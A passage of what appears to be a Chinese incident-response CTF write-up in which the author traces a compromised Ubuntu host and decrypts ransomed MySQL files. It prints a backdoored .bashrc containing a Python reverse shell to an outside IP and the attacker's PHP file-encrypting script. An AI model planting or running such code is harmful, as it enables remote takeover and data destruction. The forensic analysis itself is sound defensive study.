</span></span><span style=display:flex><span><span style=color:#f92672>[</span> -x /usr/bin/lesspipe <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> eval <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>SHELL<span style=color:#f92672>=</span>/bin/sh lesspipe<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># set variable identifying the chroot you work in (used in the prompt below)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z <span style=color:#e6db74>&#34;</span>$debian_chroot<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>[</span> -r /etc/debian_chroot <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    debian_chroot<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>cat /etc/debian_chroot<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># set a fancy prompt (non-color, unless we know we &#34;want&#34; color)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;</span>$TERM<span style=color:#e6db74>&#34;</span> in
</span></span><span style=display:flex><span>    xterm-color<span style=color:#f92672>)</span> color_prompt<span style=color:#f92672>=</span>yes;;
</span></span><span style=display:flex><span><span style=color:#66d9ef>esac</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># uncomment for a colored prompt, if the terminal has the capability; turned</span>
</span></span><span style=display:flex><span><span style=color:#75715e># off by default to not distract the user: the focus in a terminal window</span>
</span></span><span style=display:flex><span><span style=color:#75715e># should be on the output of commands, not on the prompt</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#force_color_prompt=yes</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -n <span style=color:#e6db74>&#34;</span>$force_color_prompt<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -x /usr/bin/tput <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> tput setaf <span style=color:#ae81ff>1</span> &gt;&amp;/dev/null; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># We have color support; assume it&#39;s compliant with Ecma-48</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># a case would tend to support setf rather than setaf.)</span>
</span></span><span style=display:flex><span>        color_prompt<span style=color:#f92672>=</span>yes
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        color_prompt<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;124.221.70.199&#34;,9919));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span> &amp;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$color_prompt<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>=</span> yes <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    PS1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    PS1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;${debian_chroot:+($debian_chroot)}\u@\h:\w\$ &#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>unset color_prompt force_color_prompt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># If this is an xterm set the title to user@host:dir</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;</span>$TERM<span style=color:#e6db74>&#34;</span> in
</span></span><span style=display:flex><span>xterm*|rxvt*<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    PS1<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;\[\e]0;</span><span style=color:#e6db74>${</span>debian_chroot:+($debian_chroot)<span style=color:#e6db74>}</span><span style=color:#e6db74>\u@\h: \w\a\]</span>$PS1<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    ;;
</span></span><span style=display:flex><span>*<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ;;
</span></span><span style=display:flex><span><span style=color:#66d9ef>esac</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># enable color support of ls and also add handy aliases</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -x /usr/bin/dircolors <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    test -r ~/.dircolors <span style=color:#f92672>&amp;&amp;</span> eval <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>dircolors -b ~/.dircolors<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>||</span> eval <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>dircolors -b<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    alias ls<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls --color=auto&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#alias dir=&#39;dir --color=auto&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#alias vdir=&#39;vdir --color=auto&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    alias grep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;grep --color=auto&#39;</span>
</span></span><span style=display:flex><span>    alias fgrep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;fgrep --color=auto&#39;</span>
</span></span><span style=display:flex><span>    alias egrep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;egrep --color=auto&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># some more ls aliases</span>
</span></span><span style=display:flex><span>alias ll<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls -alF&#39;</span>
</span></span><span style=display:flex><span>alias la<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls -A&#39;</span>
</span></span><span style=display:flex><span>alias l<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls -CF&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Alias definitions.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># You may want to put all your additions into a separate file like</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ~/.bash_aliases, instead of adding them here directly.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -f ~/.bash_aliases <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    . ~/.bash_aliases
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># enable programmable completion features (you don&#39;t need to enable</span>
</span></span><span style=display:flex><span><span style=color:#75715e># this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sources /etc/bash.bashrc).</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#if [ -f /etc/bash_completion ] &amp;&amp; ! shopt -oq posix; then</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#    . /etc/bash_completion</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#fi</span>
</span></span><span style=display:flex><span>root@ubuntu18:~# md5sum  /root/.bashrc
</span></span><span style=display:flex><span>4acc9c465eeeb139c194893ec0a8bcbc  /root/.bashrc
</span></span></code></pre></div><h2 id=q8-2>Q8</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串&#34;user&#34;的小写md5值，格式flag{md5}。
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:/var/www/html/include# cat config.inc.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>// Coppermine configuration file
</span></span><span style=display:flex><span>// Database configuration
</span></span><span style=display:flex><span>$CONFIG<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dbtype&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span>       <span style=color:#e6db74>&#39;pdo:mysql&#39;</span>;                  // Your database type
</span></span><span style=display:flex><span>$CONFIG<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dbserver&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span>     <span style=color:#e6db74>&#39;localhost&#39;</span>;                  // Your database server
</span></span><span style=display:flex><span>$CONFIG<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dbuser&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span>       <span style=color:#e6db74>&#39;root&#39;</span>;                       // Your database username
</span></span><span style=display:flex><span>$CONFIG<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dbpass&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span>       <span style=color:#e6db74>&#39;mysql123&#39;</span>;                   // Your database password
</span></span><span style=display:flex><span>$CONFIG<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dbname&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span>       <span style=color:#e6db74>&#39;mirage&#39;</span>;                     // Your database name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// DATABASE TABLE NAMES PREFIX
</span></span><span style=display:flex><span>$CONFIG<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;TABLE_PREFIX&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span>                  <span style=color:#e6db74>&#39;cpg16x_&#39;</span>;root@ubuntu18:/var/www/html/include# 
</span></span></code></pre></div><p>用navicat连接一下发现chase这个是打不开的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# find / -name JPMorgan@0020Chase
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/var/lib/mysql/JPMorgan@0020Chase
</span></span><span style=display:flex><span>root@ubuntu18:~# 
</span></span><span style=display:flex><span>root@ubuntu18:~# md5sum /var/lib/mysql/JPMorgan@0020Chase
</span></span><span style=display:flex><span>md5sum: /var/lib/mysql/JPMorgan@0020Chase: Is a directory
</span></span><span style=display:flex><span>root@ubuntu18:~# cat /var/lib/mysql/JPMorgan@0020Chase
</span></span><span style=display:flex><span>cat: /var/lib/mysql/JPMorgan@0020Chase: Is a directory
</span></span><span style=display:flex><span>root@ubuntu18:~# ls
</span></span><span style=display:flex><span>root@ubuntu18:~# ls /
</span></span><span style=display:flex><span>bin    etc             lib         mnt   run   swap.img  var
</span></span><span style=display:flex><span>boot   home            lib64       opt   sbin  sys       vmlinuz
</span></span><span style=display:flex><span>cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old
</span></span><span style=display:flex><span>dev    initrd.img.old  media       root  srv   usr       wireshark.pcap
</span></span><span style=display:flex><span>root@ubuntu18:~# echo -n <span style=color:#e6db74>&#34;JPMorgan@0020Chase&#34;</span> | md5sum
</span></span><span style=display:flex><span>0928a5424aa6126e5923980ca103560e  -
</span></span></code></pre></div><h2 id=q9-1>Q9</h2><pre tabindex=0><code>解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm
</span></span><span style=display:flex><span>find: ‘/proc/1980/task/1980/fdinfo/6’: No such file or directory
</span></span><span style=display:flex><span>find: ‘/proc/1980/fdinfo/5’: No such file or directory
</span></span><span style=display:flex><span>/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
</span></span><span style=display:flex><span>/var/log/journal/2bc98b82d1f84854bf5a0e90f0541f93/system@8d0a07018d4d41b185acc80dccc9f355-000000000000050d-0005f993cd1ee382.journal
</span></span><span style=display:flex><span>/var/log/journal/2bc98b82d1f84854bf5a0e90f0541f93/system@8d0a07018d4d41b185acc80dccc9f355-0000000000000f90-00060a67b8d79061.journal
</span></span><span style=display:flex><span>/var/log/tallylog
</span></span><span style=display:flex><span>/var/log/apache2/access.log
</span></span><span style=display:flex><span>/var/lib/mysql/clockup.php
</span></span><span style=display:flex><span>/var/lib/mysql/mysql/innodb_index_stats.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/mysql/innodb_table_stats.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/mirage/cpg16x_config.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/mirage/cpg16x_users.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/mirage/cpg16x_banned.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/mirage/cpg16x_temp_messages.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/mirage/cpg16x_sessions.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/JPMorgan@0020Chase/Balance.frm
</span></span><span style=display:flex><span>/var/lib/mysql/JPMorgan@0020Chase/UserIdentity.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/JPMorgan@0020Chase/Balance.ibd
</span></span><span style=display:flex><span>/var/lib/mysql/JPMorgan@0020Chase/UserIdentity.frm
</span></span><span style=display:flex><span>/var/lib/mysql/JPMorgan@0020Chase/db.opt
</span></span><span style=display:flex><span>/var/www/html/logs/security.log.php
</span></span><span style=display:flex><span>/etc/gshadow
</span></span><span style=display:flex><span>/etc/subuid
</span></span><span style=display:flex><span>/etc/passwd
</span></span><span style=display:flex><span>/etc/profile
</span></span><span style=display:flex><span>/etc/subgid
</span></span><span style=display:flex><span>/etc/group
</span></span><span style=display:flex><span>/etc/shadow
</span></span><span style=display:flex><span>/root/.bashrc
</span></span></code></pre></div><ul><li><code>-newer /var/www/html/plugins/cpg.php</code>: 找出比这个文件新的文件。</li><li><code>! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm</code>: 找出比这个文件旧的文件。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# cat /var/lib/mysql/clockup.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>$currentDate <span style=color:#f92672>=</span> date<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Y-m-d&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$key <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>$currentDate<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$iv <span style=color:#f92672>=</span> substr<span style=color:#f92672>(</span>hash<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;sha256&#39;</span>, <span style=color:#e6db74>&#34;DeepMountainsGD&#34;</span><span style=color:#f92672>)</span>, 0, 16<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$filePath <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/var/lib/mysql/JPMorgan@0020Chase&#34;</span>;
</span></span><span style=display:flex><span>$files <span style=color:#f92672>=</span> scandir<span style=color:#f92672>(</span>$filePath<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>foreach <span style=color:#f92672>(</span>$files as $file<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>$file !<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&amp;&amp;</span> $file !<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;..&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $fullPath <span style=color:#f92672>=</span> $filePath . <span style=color:#e6db74>&#39;/&#39;</span> . $file;
</span></span><span style=display:flex><span>        $content <span style=color:#f92672>=</span> file_get_contents<span style=color:#f92672>(</span>$fullPath<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        $encryptedContent <span style=color:#f92672>=</span> openssl_encrypt<span style=color:#f92672>(</span>$content, <span style=color:#e6db74>&#39;aes-256-cbc&#39;</span>, $key, 0, $iv<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        file_put_contents<span style=color:#f92672>(</span>$fullPath, $encryptedContent<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>?&gt;
</span></span></code></pre></div><p>ai解密一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 需要用户输入加密日期
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;请输入加密发生的日期（格式：YYYY-MM-DD）: &#34;</span>;
</span></span><span style=display:flex><span>$encryptedDate <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>(<span style=color:#a6e22e>fgets</span>(<span style=color:#a6e22e>STDIN</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$key <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>($encryptedDate);
</span></span><span style=display:flex><span>$iv <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>hash</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, <span style=color:#e6db74>&#34;DeepMountainsGD&#34;</span>), <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>16</span>); <span style=color:#75715e>// 修正拼写为实际值
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$filePath <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/var/lib/mysql/JPMorgan@0020Chase&#34;</span>;
</span></span><span style=display:flex><span>$files <span style=color:#f92672>=</span> <span style=color:#a6e22e>scandir</span>($filePath);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span> ($files <span style=color:#66d9ef>as</span> $file) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($file <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&amp;&amp;</span> $file <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;..&#34;</span>) {
</span></span><span style=display:flex><span>        $fullPath <span style=color:#f92672>=</span> $filePath <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> $file;
</span></span><span style=display:flex><span>        $encryptedContent <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($fullPath);
</span></span><span style=display:flex><span>        $decryptedContent <span style=color:#f92672>=</span> <span style=color:#a6e22e>openssl_decrypt</span>($encryptedContent, <span style=color:#e6db74>&#39;aes-256-cbc&#39;</span>, $key, <span style=color:#ae81ff>0</span>, $iv);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>file_put_contents</span>($fullPath, $decryptedContent);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;已解密文件: </span><span style=color:#e6db74>$fullPath\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;解密完成！</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>查一下时间，然后解密</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# php 123.php
</span></span><span style=display:flex><span>请输入加密发生的日期（格式：YYYY-MM-DD）: 2023-11-18
</span></span><span style=display:flex><span>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/Balance.frm
</span></span><span style=display:flex><span>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/Balance.ibd
</span></span><span style=display:flex><span>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/UserIdentity.frm
</span></span><span style=display:flex><span>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/UserIdentity.ibd
</span></span><span style=display:flex><span>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/db.opt
</span></span><span style=display:flex><span>解密完成！
</span></span></code></pre></div><p>重启一下数据库</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo systemctl restart mysql
</span></span></code></pre></div><pre tabindex=0><code>Chef
8FD82B8864D71ED7FA12B59E6E34CD1C
</code></pre><p><img alt=2025-03-06202650 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-06202650.png></p><h1 id=blue-team2为什么没有>blue team2为什么没有！！！</h1><p>(为什么2没有，因为太菜了看了一下wp觉得我基础知识不好，之后学好了相关知识会补:)</p><h2 id=q10-1>Q10</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。
</span></span></code></pre></div><p>suid找一下权限，下面的sudo是最近有改动的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# find / -perm -4000 -type f -exec ls -la <span style=color:#f92672>{}</span> 2&gt;/dev/null <span style=color:#ae81ff>\;</span>
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>14328</span> Jan <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2022</span> /usr/lib/policykit-1/polkit-agent-helper-1
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10232</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2017</span> /usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus <span style=color:#ae81ff>42992</span> Oct <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2022</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>130264</span> May <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2023</span> /usr/lib/snapd/snap-confine
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>100760</span> Nov <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>436552</span> Aug <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2021</span> /usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>75824</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/gpasswd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>18448</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /usr/bin/traceroute6.iputils
</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon <span style=color:#ae81ff>51464</span> Feb <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2018</span> /usr/bin/at
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>22520</span> Jan <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2022</span> /usr/bin/pkexec
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>59640</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/passwd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/newuidmap
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>149080</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2023</span> /usr/bin/sudo
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40344</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/newgrp
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/newgidmap
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44528</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/chsh
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>76496</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /usr/bin/chfn
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>26696</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/umount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44664</span> Nov <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2022</span> /bin/su
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>64424</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /bin/ping
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30800</span> Aug <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2016</span> /bin/fusermount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>43088</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/mount
</span></span></code></pre></div><pre tabindex=0><code>-rwsr-xr-x 1 root root 149080 Apr  4  2023 /usr/bin/sudo
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# md5sum /etc/sudoers
</span></span><span style=display:flex><span>6585817513b0ea96707ebb0d04d6aeff  /etc/sudoers
